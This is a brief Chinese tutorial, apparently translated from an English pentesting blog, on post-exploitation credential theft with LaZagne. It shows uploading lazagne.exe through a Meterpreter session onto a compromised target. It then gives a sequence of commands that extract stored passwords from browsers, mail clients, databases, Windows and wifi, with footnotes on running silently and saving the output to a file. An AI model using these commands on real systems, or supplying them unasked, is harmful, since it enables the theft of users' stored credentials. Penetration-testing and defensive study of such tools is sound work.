## 使用LaZagne对保存的密码进行后利用 [^1]

### **LaZagne里出名的脚本** [^2]

### **目标软件** [^3]

### **语法和参数**

![](http://ww1.sinaimg.cn/large/007DJod2gy1g0phekdbf3j30i508zdg3.jpg)

### **实现Meterpreter并上传LaZagne**

`upload lazagne.exe ./` [^4]

`lazagne.exe -h`

`lazagne.exe mails`

`lazagne.exe windows`

`lazagne.exe browsers`

`lazagne.exe databases`

`lazagne.exe wifi`

`lazagne.exe all` [^5]

`lazagne.exe all -oN` [^6]

`lazagne.exe all -vv `[^7]

`lazagne.exe all -quiet -oN` [^8]

[原文](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)

[项目地址](https://github.com/AlessandroZ/LaZagne)

---

[^1]: 该 LaZagne 是一个开源应用程序。它检索系统上存储的密码

[^2]: KeeThief 、mimipy 、mimikatz 、pypykatz、 creddump、 chainbreaker、 pyaes、 pyDes、 秘密存储等等

[^3]: 火狐、谷歌浏览器、歌剧、Skype、PostgreSQL、雷鸟、KeePass、CoreFTP、FileZilla等等

[^4]: 现在我们在目标系统上有 LaZagne ，现在是枚举密码的时候了。在meterpreter shell上使用shell命令到达目标系统上的命令行。

[^5]: 该参数运行LaZagne中的所有模块。选择此参数后，脚本将在后台运行，该脚本将提取存储在目标系统上的所有登录凭据

[^6]: 这个参数应该用一些参数运行，否则会产生错误（我们在这里使用所有参数）。此参数是可选的运行。此参数不仅会在终端屏幕上打印输出，还会在运行的目录中创建一个文件，并将其与脚本的输出一起写入。

[^7]: 这个参数应该用一些参数运行，否则会产生错误（我们在这里使用所有参数）。此参数是可选的运行。默认情况下，在 LaZagne中，我们有两个级别的详细程度。它们是0级和1级。如果没有给出参数，则自动选择0级。但是当我们给出 -vv 参数时，它会增加提取的冗长度。输出也会改变。现在，LaZagne强行运行其库中的每个脚本，并尝试提取越来越多的凭据

[^8]: 这个参数应该用一些参数运行，否则会产生错误（我们在这里使用所有参数）。此参数是可选的运行。此参数不会在终端屏幕上打印任何输出。脚本确实在后台运行，但是没有提取密码的可见性，因此我们将参数与前面讨论过的oN参数一起使用，因为它在运行的目录中创建了一个文件并将其与脚本的输出一起写入。
